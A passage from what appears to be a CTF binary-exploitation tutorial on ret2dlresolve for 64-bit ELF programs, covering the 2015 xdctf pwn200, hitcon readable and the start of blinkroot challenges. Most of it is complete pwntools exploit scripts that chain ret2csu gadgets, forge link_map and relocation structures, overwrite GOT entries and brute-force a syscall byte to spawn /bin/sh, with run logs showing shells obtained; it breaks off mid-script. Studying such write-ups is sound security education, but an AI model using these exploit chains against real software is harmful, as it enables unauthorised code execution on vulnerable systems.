    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr


    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='\x00'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='\x00'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100
sh = "/bin/sh\x00"

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'\x00')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)+len(sh)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data+sh)
bin_sh_addr = store_addr+len(resolve_data)


# rop = ROP("./main_partial_relro_64")
# rop.raw(offset*'\x00')
# sh = "/bin/sh\x00"
# bin_sh_addr = store_addr+len(resolve_data)
# rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
# rop.raw(vuln_addr)
# rop.raw("a"*(256-len(rop.chain())))
# io.send(rop.chain())
# io.send(sh)


# leak link_map addr
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
rop.raw(vuln_addr)
rop.raw('\x00'*(256-len(rop.chain())))
io.send(rop.chain())
link_map_addr = u64(io.recv(8))
print(hex(link_map_addr))


# set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
rop.raw(vuln_addr)
rop.raw('\x00'*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0))


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
# rop.raw('\x00'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

At this point, the exploitation succeeds

```shell
❯ python exp-manual4.py
[+] Starting local process './main_partial_relro_64': pid 47378
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] running in new terminal: /usr/bin/gdb -q  "./main_partial_relro_64" 47378
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] Loaded 14 cached gadgets for './main_partial_relro_64'
0x7f0d01125170
[*] Switching to interactive mode
$ whoami
iromise
```

##### Second try - no leak

As we can see, in the tests above, we still used the write function to leak the address of link_map. So, if there are no output functions in the program, can we still launch the exploit? The answer is yes. Let's look at the implementation of `_dl_fix_up` again

```c
    /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
    // 判断符号的可见性
    if (__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) == 0)
    {
        // 获取符号的版本信息
        const struct r_found_version *version = NULL;
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum = (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
        /* We need to keep the scope around so do some locking.  This is
         not necessary for objects which cannot be unloaded or when
         we are not using any threads (yet).  */
        int flags = DL_LOOKUP_ADD_DEPENDENCY;
        if (!RTLD_SINGLE_THREAD_P)
        {
            THREAD_GSCOPE_SET_FLAG();
            flags |= DL_LOOKUP_GSCOPE_LOCK;
        }
#ifdef RTLD_ENABLE_FOREIGN_CALL
        RTLD_ENABLE_FOREIGN_CALL;
#endif
        // 查询待解析符号所在的目标文件的 link_map
        result = _dl_lookup_symbol_x(strtab + sym->st_name, l, &sym, l->l_scope,
                                     version, ELF_RTYPE_CLASS_PLT, flags, NULL);
        /* We are done with the global scope.  */
        if (!RTLD_SINGLE_THREAD_P)
            THREAD_GSCOPE_RESET_FLAG();
#ifdef RTLD_FINALIZE_FOREIGN_CALL
        RTLD_FINALIZE_FOREIGN_CALL;
#endif
        /* Currently result contains the base load address (or link map)
         of the object that defines sym.  Now add in the symbol
         offset.  */
        // 基于查询到的 link_map 计算符号的绝对地址: result->l_addr + sym->st_value
        // l_addr 为待解析函数所在文件的基地址
        value = DL_FIXUP_MAKE_VALUE(result,
                                    SYMBOL_ADDRESS(result, sym, false));
    }
    else
    {
        /* We already found the symbol.  The module (and therefore its load
         address) is also known.  */
        value = DL_FIXUP_MAKE_VALUE(l, SYMBOL_ADDRESS(l, sym, true));
        result = l;
    }
```

If we intentionally set __builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) to 0, the program will execute the else branch. Specifically, we set sym->st_other to non-zero to satisfy this condition.

```c
/* How to extract and insert information held in the st_other field.  */
#define ELF32_ST_VISIBILITY(o)        ((o) & 0x03)
/* For ELF64 the definitions are the same.  */
#define ELF64_ST_VISIBILITY(o)        ELF32_ST_VISIBILITY (o)
/* Symbol visibility specification encoded in the st_other field.  */
#define STV_DEFAULT        0                /* Default symbol visibility rules */
#define STV_INTERNAL        1                /* Processor specific hidden class */
#define STV_HIDDEN        2                /* Sym unavailable in other modules */
#define STV_PROTECTED        3                /* Not preemptible, not exported */
```

At this point, the program calculates value as

```
value = l->l_addr + sym->st_value
```

By examining the [definition](https://code.woboq.org/userspace/glibc/include/link.h.html#link_map) of the link_map structure, we can see that l_addr is the first member of link_map. If we forge these two variables and leverage existing resolved function addresses, such as

- Forge link_map->l_addr as the offset between a resolved function and the target function we want to execute, e.g., addr_system-addr_xxx 
- Forge sym->st_value as the GOT table position of an already resolved function, essentially providing an implicit information leak

Then we can obtain the corresponding target address.

```c
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */
    ElfW(Addr) l_addr;                /* Difference between the address in the ELF
                                   file and the addresses in memory.  */
    char *l_name;                /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;                /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
    /* All following members are internal to the dynamic linker.
       They may change without notice.  */
    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;
    /* Number of the namespace this link map belongs to.  */
    Lmid_t l_ns;
    struct libname_list *l_libname;
    /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>.  */
    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
```

Generally speaking, at least __libc_start_main has been resolved. In this example, there is obviously more than just this one function.

```
.got:0000000000600FF0 ; ===========================================================================
.got:0000000000600FF0
.got:0000000000600FF0 ; Segment type: Pure data
.got:0000000000600FF0 ; Segment permissions: Read/Write
.got:0000000000600FF0 ; Segment alignment 'qword' can not be represented in assembly
.got:0000000000600FF0 _got            segment para public 'DATA' use64
.got:0000000000600FF0                 assume cs:_got
.got:0000000000600FF0                 ;org 600FF0h
.got:0000000000600FF0 __libc_start_main_ptr dq offset __libc_start_main
.got:0000000000600FF0                                         ; DATA XREF: _start+24↑r
.got:0000000000600FF8 __gmon_start___ptr dq offset __gmon_start__
.got:0000000000600FF8                                         ; DATA XREF: _init_proc+4↑r
.got:0000000000600FF8 _got            ends
.got:0000000000600FF8
.got.plt:0000000000601000 ; ===========================================================================
.got.plt:0000000000601000
.got.plt:0000000000601000 ; Segment type: Pure data
.got.plt:0000000000601000 ; Segment permissions: Read/Write
.got.plt:0000000000601000 ; Segment alignment 'qword' can not be represented in assembly
.got.plt:0000000000601000 _got_plt        segment para public 'DATA' use64
.got.plt:0000000000601000                 assume cs:_got_plt
.got.plt:0000000000601000                 ;org 601000h
.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000601008 qword_601008    dq 0                    ; DATA XREF: sub_400500↑r
.got.plt:0000000000601010 qword_601010    dq 0                    ; DATA XREF: sub_400500+6↑r
.got.plt:0000000000601018 off_601018      dq offset write         ; DATA XREF: _write↑r
.got.plt:0000000000601020 off_601020      dq offset strlen        ; DATA XREF: _strlen↑r
.got.plt:0000000000601028 off_601028      dq offset setbuf        ; DATA XREF: _setbuf↑r
.got.plt:0000000000601030 off_601030      dq offset read          ; DATA XREF: _read↑r
.got.plt:0000000000601030 _got_plt        ends
.got.plt:0000000000601030
```

At the same time, by reading the code of the `_dl_fixup` function, after setting `__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0)` to 0, we can see that the function primarily relies on the content of l_info in link_map. Therefore, we also need to forge the required content for this part.

The exploitation code is as follows

```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637


def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    return payload


def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
    '''
    elf: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap
    
    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']
    
    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute
    
    WARNING: assert *(known_function_ptr-8) & 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o & 0x3
    
    WARNING: be careful that fake_linkmap is 0x100 bytes length   

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: p_r_offset, offset pointer to the resloved addr
        0x20: r_info
        0x28: append
      resolved addr
        0x30: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38
        0x38: 6, tag of the DT_SYMTAB
        0x40: known_function_ptr-8, p_fake_symbol_table
      command that you want to execute for system
        0x48: /bin/sh
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x38
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''
    plt0 = elf.get_section_by_name('.plt').header.sh_addr

    linkmap = p64(offset_of_two_addr & (2**64 - 1))
    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
    # here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr
    linkmap += p64((fake_linkmap_addr + 0x30 - offset_of_two_addr)
                   & (2**64 - 1)) + p64(0x7) + p64(0)
    linkmap += p64(0)
    linkmap += p64(6) + p64(known_function_ptr-8)
    linkmap += '/bin/sh\x00'           # cmd offset 0x48
    linkmap = linkmap.ljust(0x68, 'A')
    linkmap += p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr + 0x38)
    linkmap = linkmap.ljust(0xf8, 'A')
    linkmap += p64(fake_linkmap_addr + 8)

    resolve_call = p64(plt0+6) + p64(fake_linkmap_addr) + p64(0)
    return (linkmap, resolve_call)


io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

fake_linkmap_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'\x00')
libc = ELF('libc.so.6')
link_map, resolve_call = ret2dlresolve_with_fakelinkmap_x64(elf,fake_linkmap_addr, elf.got['read'],libc.sym['system']- libc.sym['read'])
rop.raw(csu(0, 1, elf.got['read'], 0, fake_linkmap_addr, len(link_map)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain()) <= 256)
io.send(rop.chain())
# send linkmap
io.send(link_map)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
#0x00000000004007a1: pop rsi; pop r15; ret; 
rop.raw(0x00000000004007a1)  # stack align 16 bytes
rop.raw(0)
rop.raw(0)
rop.raw(0x00000000004007a3)  # 0x00000000004007a3: pop rdi; ret;
rop.raw(fake_linkmap_addr + 0x48)
rop.raw(resolve_call)
io.send(rop.chain())
io.interactive()
```

The final execution result

```shell
❯ python exp-fake-linkmap.py
[+] Starting local process './main_partial_relro_64': pid 51197
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] running in new terminal: /usr/bin/gdb -q  "./main_partial_relro_64" 51197
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] Loaded 14 cached gadgets for './main_partial_relro_64'
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ whoami
iromise
```

Although in this type of attack we no longer need information leakage, we do need to know the target machine's libc. More specifically, we need to know the offset between the target function and a certain already-resolved function.

#### Tool-based Forgery

Interested readers can try using the relevant tools on their own to see if the attack can succeed.

### Full RELRO

## 2015-hitcon-readable

Checking the file permissions, we can see that the executable only has NX protection enabled

```bash
❯ checksec readable
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-readable/readable'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This means we can actually directly modify the content of the dynamic section. However, unlike 2015-xdctf-pwn200, here the stack overflow can only read 16 bytes out of bounds, while the ret2csu used in the above example requires a large number of bytes. Therefore, directly using that method won't work.

Let's carefully analyze the current situation: we can control rbp and the return address out of bounds. Considering that read uses rbp to index the buffer

```
.text:0000000000400505                 lea     rax, [rbp-10h]
.text:0000000000400509                 mov     edx, 20h ; ' '  ; nbytes
.text:000000000040050E                 mov     rsi, rax        ; buf
.text:0000000000400511                 mov     edi, 0          ; fd
.text:0000000000400516                 mov     eax, 0
.text:000000000040051B                 call    _read
.text:0000000000400520                 leave
.text:0000000000400521                 retn
```

If we control rbp to be the write address plus 0x10, i.e., targetaddr+0x10, and then jump to 0x400505, the stack structure would be

```
return_addr -> 0x400505
rbp         -> target addr + 0x10
fake buf
```

Then we can control the program to write 16 bytes at the target address. By continuously repeating this operation, we can keep reading 16 bytes at a time, thereby achieving the ability to read arbitrary-length bytes.

### Method 1: Modify Dynamic Section

```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./readable")
rop = ROP("./readable")
elf = ELF("./readable")

bss_addr = elf.bss()
csu_first_addr = 0x40058A
csu_second_addr = 0x400570

def csu_gadget(rbx, rbp, func_ptr, edi, rsi, rdx):
    # rdx = r13
    # rsi = r14
    # rdi = r15d
    # call [r12+rbx*8]
    # set rbx+1=rbp
    return flat([csu_first_addr, rbx, rbp, func_ptr, rdx,
                    rsi, edi, csu_second_addr], arch="amd64")+'a' * 0x38

def read16bytes(targetaddr, content):
    payload = 'a'*16
    payload += p64(targetaddr+0x10)
    payload += p64(0x400505)
    payload += content.ljust(16, "\x00")
    payload += p64(0x600890)
    payload += p64(0x400505)
    return payload

# stack privot to bss segment, set rsp = new_stack
fake_data_addr = bss_addr
new_stack = bss_addr+0x500

# modify .dynstr pointer in .dynamic section to a specific location
rop = csu_gadget(0, 1 ,elf.got['read'],0,0x600778+8,8)
# construct a fake dynstr section
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop += csu_gadget(0, 1 ,elf.got['read'],0,fake_data_addr,len(dynstr))
# read /bin/sh\x00
binsh_addr = fake_data_addr+len(dynstr)
rop += csu_gadget(0, 1 ,elf.got['read'],0,binsh_addr,len("/bin/sh\x00"))
# 0x0000000000400593: pop rdi; ret; 
rop +=p64(0x0000000000400593)+p64(binsh_addr)
# 0x0000000000400590: pop r14; pop r15; ret; 
rop +=p64(0x0000000000400590) +'a'*16 # stack align
# return to the second instruction of read'plt
rop +=p64(0x4003E6)

# gdb.attach(io)
# pause()
for i in range(0,len(rop),16):
    tmp = read16bytes(new_stack+i,rop[i:i+16])
    io.send(tmp)


# jump to the rop
payload = 'a'*16
payload += p64(new_stack-8)
payload += p64(0x400520)  # leave ret
io.send(payload)

# send fake dynstr addr
io.send(p64(fake_data_addr))
# send fake dynstr section
io.send(dynstr)
# send "/bin/sh\x00"
io.send("/bin/sh\x00")
io.interactive()
```

### Method 2 - Standard ROP

This method is rather clever. Considering that the read function is short and ultimately makes a system call, the libc implementation uses the syscall instruction. Since we can modify read's GOT table, if we change read@got.plt to the address of syscall and set up the relevant parameters, we can execute system calls. Here we control ROP to execute `execve("/bin/sh",NULL,NULL)`.

First, we need to brute-force to find the specific address of syscall. We can consider calling the write function to check whether the syscall instruction was actually executed

```
def bruteforce():
    rop_addr = elf.bss()
    for i in range(0, 256):
        io = process("./readable")
        # modify read's got
        payload = csu_gadget(0, 1, elf.got["read"], 1, elf.got["read"], 0)
        # jump to read again
        # try to write ELF Header to stdout
        payload += csu_gadget(0, 1, elf.got["read"], 4, 0x400000, 1)
        # gdb.attach(io)
        # pause()
        for j in range(0, len(payload), 16):
            tmp = read16bytes(rop_addr+j, payload[j:j+16])
            io.send(tmp)
        # jump to the rop
        payload = 'a'*16
        payload += p64(rop_addr-8)
        payload += p64(0x400520)  # leave ret

        io.send(payload)
        io.send(p8(i))
        try:
            data = io.recv(timeout=0.5)
            if data == "\x7FELF":
                print(hex(i), data)
        except Exception as e:
            pass
        io.close()
```

That is, we control the program to output the ELF file header — if it outputs successfully, then we know it works. Additionally, here we use the return value of the read function to control the value of the rax register, in order to control which specific system call we want to execute. The execution result is as follows

```bash
❯ python exp.py
('0x8f', '\x7fELF')
('0xc2', '\x7fELF')
```

By comparing with libc.so, we can indeed see that there is a `syscall` instruction at the corresponding offset

```
.text:000000000011018F                 syscall                 ; LINUX - sys_read
.text:00000000001101C2                 syscall                 ; LINUX - sys_read
```

The libc version is

```
❯ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
```

Note that different libc versions may have different offsets.

The complete code is as follows

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error'
elf = ELF("./readable")
csu_first_addr = 0x40058A
csu_second_addr = 0x400570


def read16bytes(targetaddr, content):
    payload = 'a'*16
    payload += p64(targetaddr+0x10)
    payload += p64(0x400505)
    payload += content.ljust(16, "\x00")
    payload += p64(0x600f00)
    payload += p64(0x400505)
    return payload


def csu_gadget(rbx, rbp, r12, r13, r14, r15):
    # rdx = r13
    # rsi = r14
    # rdi = r15d
    # call [r12+rbx*8]
    # set rbx+1=rbp
    payload = flat([csu_first_addr, rbx, rbp, r12, r13,
                    r14, r15, csu_second_addr], arch="amd64")
    return payload


def bruteforce():
    rop_addr = elf.bss()
    for i in range(0, 256):
        io = process("./readable")
        # modify read's got
        payload = csu_gadget(0, 1, elf.got["read"], 1, elf.got["read"], 0)
        # jump to read again
        # try to write ELF Header to stdout
        payload += csu_gadget(0, 1, elf.got["read"], 4, 0x400000, 1)
        # gdb.attach(io)
        # pause()
        for j in range(0, len(payload), 16):
            tmp = read16bytes(rop_addr+j, payload[j:j+16])
            io.send(tmp)
        # jump to the rop
        payload = 'a'*16
        payload += p64(rop_addr-8)
        payload += p64(0x400520)  # leave ret

        io.send(payload)
        io.send(p8(i))
        try:
            data = io.recv(timeout=0.5)
            if data == "\x7FELF":
                print(hex(i), data)
        except Exception as e:
            pass
        io.close()


def exp():
    rop_addr = elf.bss()
    io = process("./readable")
    execve_number = 59
    bin_sh_addr = elf.got["read"]-execve_number+1
    # modify the last byte of read's got
    payload = csu_gadget(0, 1, elf.got["read"], execve_number, bin_sh_addr, 0)
    # jump to read again, execve("/bin/sh\x00")
    payload += csu_gadget(0, 1, elf.got["read"],
                          bin_sh_addr+8, bin_sh_addr+8, bin_sh_addr)
    for j in range(0, len(payload), 16):
        tmp = read16bytes(rop_addr+j, payload[j:j+16])
        io.send(tmp)
    # jump to the rop
    payload = 'a'*16
    payload += p64(rop_addr-8)
    payload += p64(0x400520)  # leave ret
    io.send(payload)

    payload = '/bin/sh'.ljust(execve_number-1, '\x00')+p8(0xc2)
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    # bruteforce()
    exp()
```

## 2015-hitcon-quals-blinkroot

Let's briefly check the program's protections

```bash
❯ checksec blinkroot
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-blinkroot/blinkroot'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We find that the program has Canary protection enabled.

The basic logic of the program is

- Read 1024 bytes at a specified position in bss
- Close stdin, stdout, and stderr.
- Then we can set 16 bytes at any 16-byte aligned address, where the lower 8 bytes are fixed as 0x10 and the upper 8 bytes are fully controllable.

Clearly there is no information leakage here, and of course we have no way to overwrite the return address to control the program's execution flow. However, since the program does not have RELRO protection enabled, we can consider modifying the ELF file's string table. At the same time, we observe that

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  if ( recvlen(0, (char *)&data, 0x400uLL) == 1024 )
  {
    close(0);
    close(1);
    close(2);
    *(__m128 *)((char *)&data + data) = _mm_loadh_ps(&dbl_600BC8);
    puts(s);
  }
  _exit(0);
}
```

The program will execute the puts function, and the specific address of the puts function is at offset 0x10 from the data variable.

```
.bss:0000000000600BC0                 public data
.bss:0000000000600BC0 data            dq ?                    ; DATA XREF: main+B↑o
.bss:0000000000600BC0                                         ; main+4D↑r ...
.bss:0000000000600BC8 ; double dbl_600BC8
.bss:0000000000600BC8 dbl_600BC8      dq ?                    ; DATA XREF: main+5C↑o
.bss:0000000000600BD0 ; char s[1008]
.bss:0000000000600BD0 s               db 3F0h dup(?)          ; DATA XREF: main+72↑o
.bss:0000000000600BD0 _bss            ends
```

Therefore, we can control s to be /bin/sh and control the puts function in the string table to be the system function, which would allow us to call the system function. However, while the idea is good, we find that

```
LOAD:00000000006009E8                 Elf64_Dyn <5, 400340h>  ; DT_STRTAB
LOAD:00000000006009F8                 Elf64_Dyn <6, 400280h>  ; DT_SYMTAB
LOAD:0000000000600A08                 Elf64_Dyn <0Ah, 69h>    ; DT_STRSZ
```

The string table is not 16-byte aligned, so this approach won't work. Let's try using the approach for Partial RELRO instead.

Since we cannot leak address information, we can adopt the approach of forging linkmap, namely

- Use the arbitrary write provided by the challenge to modify linkmap to point to already resolved addresses
- Hijack the control flow through the puts function that will be called next in the challenge

Here we can find that the linkmap is stored at address 0x600B48, so we can start setting data from 0x600B40.

```assembly
.got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000600B48 qword_600B48    dq 0                    ; DATA XREF: sub_4004D0↑r
```

Additionally, it should be noted that the puts function's index in the relocation table is 1. This needs to be considered when constructing the linkmap.

```assembly
.plt:00000000004004F0 ; int puts(const char *s)
.plt:00000000004004F0 _puts           proc near               ; CODE XREF: main+77↓p
.plt:00000000004004F0                 jmp     cs:off_600B60
.plt:00000000004004F0 _puts           endp
.plt:00000000004004F0
.plt:00000000004004F6 ; ---------------------------------------------------------------------------
.plt:00000000004004F6                 push    1
.plt:00000000004004FB                 jmp     sub_4004D0
```

The exploitation script is as follows

```python
from pwn import *
context.terminal=["tmux","splitw","-h"]
io = process("blinkroot")
elf = ELF("blinkroot")
libc = ELF("./libc.so.6")

def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
    '''
    elf: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap
    
    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']
    
    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute
    
    WARNING: assert *(known_function_ptr-8) & 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o & 0x3
    
    WARNING: be careful that fake_linkmap is 0x100 bytes length   

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: padding for the relocation entry of idx=0
        0x20: padding for the relocation entry of idx=0
        0x28: padding for the relocation entry of idx=0
        0x30: p_r_offset, offset pointer to the resloved addr
        0x38: r_info
        0x40: append    
      resolved addr
        0x48: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x50
        0x50: 6, tag of the DT_SYMTAB
        0x58: known_function_ptr-8, p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x50
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''
    plt0 = elf.get_section_by_name('.plt').header.sh_addr

    linkmap = p64(offset_of_two_addr & (2**64 - 1))
    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
    linkmap += p64(0)*3
    # here we set p_r_offset = fake_linkmap_addr + 0x48 - two_offset
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr
    linkmap += p64((fake_linkmap_addr + 0x48 - offset_of_two_addr)
                   & (2**64 - 1)) + p64(0x7) + p64(0)
